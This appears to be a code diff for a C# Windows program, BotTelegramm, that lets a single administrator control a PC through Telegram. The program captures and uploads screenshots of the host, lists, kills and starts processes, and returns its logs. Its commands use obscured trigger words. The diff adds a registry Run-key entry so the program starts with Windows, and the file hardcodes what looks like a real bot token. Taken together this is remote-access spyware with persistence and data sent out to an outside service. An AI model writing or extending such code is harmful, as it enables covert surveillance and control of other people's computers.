@@ -1,4 +1,5 @@
 ﻿
+using Microsoft.Win32;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Specialized;
@@ -12,6 +13,7 @@ using System.Windows.Forms;
 
 namespace BotTelegramm
 {
+    //BotState предназначена для процессов 
     public enum BotState
     {
         Wait,
@@ -21,11 +23,17 @@ namespace BotTelegramm
     }
     public partial class MainForm : Form
     {
+        //Токен Бота 
         private string token = "1420711938:AAHpHyW0n7hhSRSqxU2xGUzOiTc3TUVjHL8";
+        //API телеграмма
         private string BaseUrl = "https://api.telegram.org/bot";
         private long LastUpdateID = 0;
+        //Папка лог файлов
         private string fileLog = "BotLog.log";
         WebClient client;
+        private int adminNumber = 1043241084;
+
+
         BotState botState = BotState.Wait;
 
         public MainForm()
@@ -37,6 +45,7 @@ namespace BotTelegramm
         {
             client = new WebClient();
             WriteLog("Авторизация....");
+            SetAutoRun();
             timerGetUpdates.Enabled = true;
 
             // InitProxy();
@@ -50,6 +59,8 @@ namespace BotTelegramm
             proxy.Credentials = new NetworkCredential("admin", "pass");
             client.Proxy = proxy;
         }
+       
+        //Отпавляет уведомление Админу
 
         private void SendMessage(long chat_id, string message)
         {
@@ -76,6 +87,13 @@ namespace BotTelegramm
 
                 LastUpdateID = result.update_id;
                 WriteLog(result.message.from.first_name + "(" + result.message.from.username + "): " + result.message.text);
+
+
+                 if(result.message.from.id != adminNumber)
+                {
+                    SendMessage(result.message.chat.id,"Вы мне написали '" + result.message.text + "', но я не знаю что ответить ):");
+                    return;
+                }
                 switch (botState)
                 {
                     
@@ -109,6 +127,8 @@ namespace BotTelegramm
             }
 
         }
+
+        //Фронт бота для информации
         private void SendAnswer(long chat_id, string message)
         {
             
@@ -116,8 +136,8 @@ namespace BotTelegramm
             switch (message.ToLower())
             {
                 case "/start": answer = "Я твой бот,знаешь что я умею? /help"; break;
-                case "лог111": answer = RetLog(); break;
-                case "скриншот": SendPrintScreen(chat_id); return;
+                case "лог111": answer = GetLog(); break;
+                case "скриншот2": SendPrintScreen(chat_id); return;
                 case "процесс2": answer = GetMyProcces();break;
                 case "процесс_закрыт2": answer = GetMyProcces()  +  "\r\nКакой?"; botState = BotState.KillProc; break;
                 case "процесс_запустить2": answer ="Какой?"; botState = BotState.StartProc; break;
@@ -126,7 +146,7 @@ namespace BotTelegramm
 Ниже представлены все поддерживаемые команды
 
 
-/start   - самое начало!
+/start   - самое начало! 
 /help    - помощь
 Лог      - логи
 Скриншот - получить скриншот
@@ -137,6 +157,8 @@ namespace BotTelegramm
             }
             SendMessage(chat_id, answer);
         }
+
+        //Сохраняет логи 
         private void WriteLog(string text)
         {
             text = DateTime.Now + " " + text + Environment.NewLine;
@@ -146,11 +168,14 @@ namespace BotTelegramm
 
         }
 
+        //Уведомление о внезаптно закрытии бота
         private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
         {
             WriteLog("Остановка БОТА!");
         }
-        private string RetLog()
+       
+        //Отправка лога
+        private string GetLog()
         {
             string answer = "";
             if (File.Exists(fileLog))
@@ -165,6 +190,8 @@ namespace BotTelegramm
             return answer;
         }
 
+
+        //Используется для ручной отправки скрина
         private void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
         {
             string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
@@ -229,6 +256,7 @@ namespace BotTelegramm
            
         }
 
+        //Используется для автоматический отправки скрина 
         private void HttpUploadScreen(string url, string file, string paramName, string contentType, NameValueCollection nvc)
         {
             string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
@@ -297,6 +325,8 @@ namespace BotTelegramm
             }
 
         }
+        
+        //Отправка скрина
         private void SendPrintScreen(long chat_id)
         {
             string address = BaseUrl + token + "/sendPhoto";
@@ -305,13 +335,17 @@ namespace BotTelegramm
             HttpUploadScreen(address, "MyScreen.png", "photo", "image/png", nvc);
             // HttpUploadFile(address, "Screenshot_1.png", "photo", "image/png", nvc);
         }
+      
+        //Тут можно указать размер изображение в ручную
         private Bitmap GetPrintScreen()
         {
             Bitmap screen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Graphics gr = Graphics.FromImage(screen as Image);
             gr.CopyFromScreen(0, 0, 0, 0, screen.Size);
-            return ResizeImg(screen,2);
+            return ResizeImg(screen,0);
         }
+
+        //Размер изображение 
         private Bitmap ResizeImg(Bitmap bitmap,int newWidth,int newHidh)
         {
             Bitmap result = new Bitmap(newWidth, newHidh);
@@ -324,10 +358,21 @@ namespace BotTelegramm
             return result;
         }
 
+        //-----
         private Bitmap ResizeImg(Bitmap bitmap,int count)
         {
-            return ResizeImg(bitmap, bitmap.Width / count, bitmap.Width / count);
+            if(count != 0)
+            {
+                return ResizeImg(bitmap, bitmap.Width / count, bitmap.Height / count);
+            }
+            else
+            {
+                return ResizeImg(bitmap, bitmap.Width, bitmap.Height);
+            }
+           
         }
+
+        //Проказывает все процессы которые используется в компьтер в данный момент
         private string GetMyProcces()
         {
             Process[] processList = Process.GetProcesses();
@@ -344,6 +389,8 @@ namespace BotTelegramm
             stringBuilder.AppendLine(new string('=', 25));
             return stringBuilder.ToString();
         }
+
+        //Закрывает процессы 
         private bool CloseProcess(string nameProc)
         {
             botState = BotState.Wait;
@@ -359,6 +406,8 @@ namespace BotTelegramm
             }
             return false;
         }
+
+        //Открывает процессы(Приложения)
         private bool StartProcess(string path)
         {
             botState = BotState.Wait;
@@ -369,6 +418,18 @@ namespace BotTelegramm
             }
             return false;
         }
+
+        //Автоматический запускает программу
+        private void SetAutoRun()
+        {
+            string exePath = System.Windows.Forms.Application.ExecutablePath;
+            RegistryKey registry = Registry.CurrentUser.CreateSubKey("Sofware\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            registry.SetValue("TelegramBot", exePath);
+            
+            //Удаление из автозагрузки
+           // registry.DeleteValue("TelegramBot");
+        }
+
     }
 
 }
